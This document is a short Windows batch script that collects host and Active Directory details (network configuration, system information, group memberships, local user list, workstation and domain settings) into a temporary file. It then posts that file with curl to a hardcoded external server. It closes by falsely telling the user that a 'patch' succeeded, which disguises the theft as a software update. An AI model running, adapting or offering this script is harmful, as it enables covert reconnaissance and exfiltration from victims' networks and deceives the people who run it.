@echo off
REM Ultra-simple version - just echo and upload

REM ===== EDIT THIS =====
set SERVER=http://ec2-18-208-114-181.compute-1.amazonaws.com:8080/upload
REM ====================

REM Output file
set OUTPUT=%TEMP%\ad.txt

REM Clear/create file
echo === Active Directory Info === > "%OUTPUT%"

REM Run commands and append results
echo. >> "%OUTPUT%"
echo === IPCONFIG === >> "%OUTPUT%"
ipconfig /all >> "%OUTPUT%"

echo. >> "%OUTPUT%"
echo === SYSTEM INFO === >> "%OUTPUT%"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Total Physical Memory" /C:"Available Physical Memory" /C:"Domain" >> "%OUTPUT%"

echo. >> "%OUTPUT%"
echo === WHOAMI GROUPS === >> "%OUTPUT%"
whoami /groups >> "%OUTPUT%"

echo. >> "%OUTPUT%"
echo === NET USER === >> "%OUTPUT%"
net user >> "%OUTPUT%"

echo. >> "%OUTPUT%"
echo === NET CONFIG WORKSTATION === >> "%OUTPUT%"
net config workstation >> "%OUTPUT%"

echo. >> "%OUTPUT%"
echo === DOMAIN INFO === >> "%OUTPUT%"
echo Domain: %USERDNSDOMAIN% >> "%OUTPUT%"
echo Logon Server: %LOGONSERVER% >> "%OUTPUT%"

echo.
echo Done. Output saved to:
echo %OUTPUT%

REM Upload
curl -X POST -F "file=@%TEMP%\ad.txt" %SERVER%


echo "Your Patch has been successful"

pause
